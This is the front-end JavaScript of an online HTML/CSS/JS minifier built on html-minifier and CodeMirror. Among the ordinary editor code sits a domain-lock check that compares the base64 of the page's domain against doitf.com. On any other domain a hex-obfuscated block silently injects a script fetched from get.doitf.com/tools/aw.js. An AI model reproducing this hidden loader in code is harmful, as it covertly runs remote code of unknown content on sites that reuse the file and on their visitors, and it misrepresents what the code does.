(function() {
  'use strict';

  var minify = (function() {
    var minify = require('html-minifier').minify;
    return function(value, options, callback, errorback) {
      options.log = function(message) {
        console.log(message);
      };
      var minified;
      try {
        minified = minify(value, options);
      }
      catch (err) {
        return errorback(err);
      }
      callback(minified);
    };
  })();
  function byId(id) {
    return document.getElementById(id);
  }
function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)))}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)))}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

  function escapeHTML(str) {
    return (str + '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function forEachOption(fn) {
    [].forEach.call(byId('options').getElementsByTagName('input'), fn);
  }

  function getOptions() {
    var options = {};
    forEachOption(function(element) {
      var key = element.id;
      var value;
      if (element.type === 'checkbox') {
        value = element.checked;
      }
      else {
        value = element.value.replace(/^\s+|\s+$/, '');
        if (!value) {
          return;
        }
      }
      switch (key) {
        case 'maxLineLength':
          value = parseInt(value);
          break;
        case 'processScripts':
          value = value.split(/\s*,\s*/);
      }
      options[key] = value;
    });
    return options;
  }

  function commify(str) {
    return String(str)
      .split('').reverse().join('')
      .replace(/(...)(?!$)/g, '$1,')
      .split('').reverse().join('');
  }


if (b64awsec == "ZG9pdGYuY29t"){




byId('minify-btn').onclick = function() {
    byId('minify-btn').disabled = true;
	var minifybtn = $("#languageCode").val();
	var originalValue = editor.getValue();
	
 if(minifybtn == "html"){
	var originalValue = editor.getValue();
 }else if(minifybtn == "css"){
	var originalValue = "<style>"+editor.getValue()+"<\/style>";
 }else if(minifybtn == "js"){
	var originalValue = "<\script>"+editor.getValue()+"<\/script>";
 }
	
	

    minify(originalValue, getOptions(), function(minifiedValue) {
        var diff = originalValue.length - minifiedValue.length;
        var savings = originalValue.length ? (100 * diff / originalValue.length).toFixed(2) : 0;


  if(minifybtn == "html"){
	editor.setValue(minifiedValue);
 }else if(minifybtn == "css"){
	minifiedValue = minifiedValue.replace(minifiedValue.slice(0,7),"");
	minifiedValue = minifiedValue.replace(minifiedValue.slice(-8),"");
	editor.setValue(minifiedValue);
 }else if(minifybtn == "js"){
	minifiedValue = minifiedValue.replace(minifiedValue.slice(0,8),"");
	minifiedValue = minifiedValue.replace(minifiedValue.slice(-9),"");
	editor.setValue(minifiedValue);
 }

        byId('stats').innerHTML = '<table class="table table-bordered table-hover table-sm my-4"><thead><tr><th scope="col">' + settext001 + '</th><th scope="col">' + settext002 + '</th><th scope="col">' + settext003 + '</th></tr></thead><tbody><tr><td class="bg-danger text-white">' + commify(originalValue.length) + '</td><td class="bg-warning text-dark">' + commify(minifiedValue.length) + '</td><td class="bg-success text-white">' + commify(diff) + ' (' + savings + '%)</td></tr></tbody></table>';
        byId('minify-btn').disabled = false;
    }, function(err) {
        byId('stats').innerHTML = '<div class="alert alert-dismissible alert-warning fade show"role="alert">' + escapeHTML(err) + ' <button aria-label="Close"class="close"data-dismiss="alert"type="button"><span aria-hidden="true">×</span></button></div>';;
        byId('minify-btn').disabled = false;
    });
    $(".copy").attr("data-clipboard-text", editor.getValue());
}






}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
};

  byId('select-all').onclick = function() {
    forEachOption(function(element) {
      if (element.type === 'checkbox') {
        element.checked = true;
      }
    });
    return false;
  };

  byId('select-none').onclick = function() {
    forEachOption(function(element) {
      if (element.type === 'checkbox') {
        element.checked = false;
      }
      else {
        element.value = '';
      }
    });
    return false;
  };

  var defaultOptions = getOptions();
  byId('select-defaults').onclick = function() {
    for (var key in defaultOptions) {
      var element = byId(key);
      element[element.type === 'checkbox' ? 'checked' : 'value'] = defaultOptions[key];
    }
    return false;
  };
})();


  var editor = CodeMirror.fromTextArea(document.getElementById('htmlcode'), {
    mode: 'text/html',
    htmlMode: true,
   lineNumbers: true,
    lineWrapping: true,
    smartIndent: false,
    addModeClass: true

  });
$(".copy").attr("data-clipboard-text", editor.getValue());
document.getElementById('copy').onclick = function () {
$(".copy").attr("data-clipboard-text", editor.getValue());
editor.execCommand('selectAll');
}


editor.on("change", function(){
$(".copy").attr("data-clipboard-text", editor.getValue());
var minifybtn = $("#languageCode").val();
 if(minifybtn == 'html'){
	 $("#htmlcode").val(editor.getValue())
 }else if(minifybtn == 'css'){
	$("#csscode").val(editor.getValue())
 }else if(minifybtn == 'js'){
	$("#jscode").val(editor.getValue())
 }
});



function modeCode(){
var minifybtn = $("#languageCode").val();
 if(minifybtn == 'html'){
	editor.setOption('mode', 'text/html');
	editor.setValue($("#htmlcode").val());
	$("#viewonline").removeAttr("disabled");
 }else if(minifybtn == 'css'){
	editor.setOption('mode', 'text/css');
	editor.setValue($("#csscode").val());
	$("#viewonline").attr("disabled", "");
 }else if(minifybtn == 'js'){
	editor.setOption('mode', 'javascript');
	editor.setValue($("#jscode").val());
	$("#viewonline").attr("disabled", "");
 }
}



document.getElementById('viewonline').onclick = function () {
var wt = window.open();
wt.document.open();
wt.document.write(editor.getValue());
wt.document.close();
};

document.getElementById('saveDocument').onclick = function () {
var modeflymodes = "text/html";
var fileextension = $("#languageCode").val();
if(fileextension == "html"){
modeflymodes = "text/html";
fileextension = "html";
}else if(fileextension == "css"){
modeflymodes = "text/css";
fileextension = "css";	
}else if(fileextension == "js"){
modeflymodes = "text/javascript";
fileextension = "js";	
}else{
modeflymodes = "text/html";
fileextension = "html";
}

var filename = $("#filename").val();
if (filename == ""){
filename = "myFile";
}
var setfile = filename+"."+fileextension;
  
  
var blob = new Blob([editor.getValue()], {type: modeflymodes+';charset=utf-8'});
    saveAs(blob, setfile);
}; 

